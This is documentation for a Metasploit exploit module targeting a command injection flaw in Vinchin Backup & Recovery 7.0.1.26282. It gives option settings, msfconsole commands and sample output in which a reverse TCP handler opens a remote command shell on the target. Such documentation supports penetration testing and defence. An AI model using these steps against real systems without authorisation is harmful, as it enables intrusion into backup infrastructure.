# Vinchin Backup & Recovery Command Injection Exploit Documentation

## Overview

**Module Name**: `exploit/linux/http/vinchin_backup_recovery_cmd_inject`

**Module Type**: Exploit

**Platform**: Linux

**Privilege Escalation**: No

**Remote Exploit**: Yes

**Disclosure Date**: 2023-10-26

## Description

A command injection vulnerability exists within the Vinchin Backup & Recovery product. This exploit module takes advantage of this vulnerability by sending a crafted HTTP request containing the injected command. Successful exploitation will result in the execution of arbitrary commands on the target system under the context of the web server user.

## Module Requirements

- Metasploit Framework
- Network access to the target system via port 443 (or other, if configured)

## Target

Vinchin Backup & Recovery systems with version detected as 7.0.1.26282.

## Options

- **RHOSTS**: The target address
- **RPORT**: The target port (default: 443)
- **SSL**: Specify the use of SSL (default: true)
- **TARGETURI**: The base path to the Vinchin Backup & Recovery application (default: `/api/`)
- **APIKEY**: The hardcoded API key required to authenticate to the API
- **Proxies**: A proxy chain
- **VHOST**: HTTP server virtual host

## Payload Options

- **LHOST**: The local host to listen on (interface/IP)
- **LPORT**: The local port to listen on (default: 4444)

## Usage Instructions

1. Use Metasploit to access the module:
   ```
   use exploit/linux/http/vinchin_backup_recovery_cmd_inject
   ```

2. Set the necessary options:
   ```
   set RHOSTS <target_ip>
   set LHOST <local_ip>
   set APIKEY <api_key>
   ```

3. (Optional) Set the payload:
   ```
   set payload <payload_name>
   ```

4. Verify the target’s vulnerability:
   ```
   check
   ```

5. Execute the exploit:
   ```
   exploit
   ```

## Scenarios

### Successful Exploitation against Vinchin Backup & Recovery 7.0.1.26282

1. Start `msfconsole` and load the exploit.
2. Set the `RHOSTS`, `RPORT`, `LHOST`, and any other required options.
3. Verify the target’s vulnerability with the `check` command.
4. Run the `exploit` command.
5. Upon successful exploitation, a shell or other specified payload will be executed on the target.

**Console Output Example**:

```
msf6 > use exploit/linux/http/vinchin_backup_recovery_cmd_inject
msf6 exploit(linux/http/vinchin_backup_recovery_cmd_inject) > set RHOSTS 192.168.56.1
msf6 exploit(linux/http/vinchin_backup_recovery_cmd_inject) > set LHOST 192.168.56.15
msf6 exploit(linux/http/vinchin_backup_recovery_cmd_inject) > check

[*] HTTP Response Code: 200
[*] Detected Vinchin version: 7.0.1.26282
[+] 192.168.56.1:443 - The target is vulnerable.

msf6 exploit(linux/http/vinchin_backup_recovery_cmd_inject) > exploit

[*] Started reverse TCP handler on 192.168.56.15:4444 
...
[*] Command shell session 1 opened (192.168.56.15:4444 -> 192.168.56.1:443) at 2023-10-26 12:34:56 -0400
```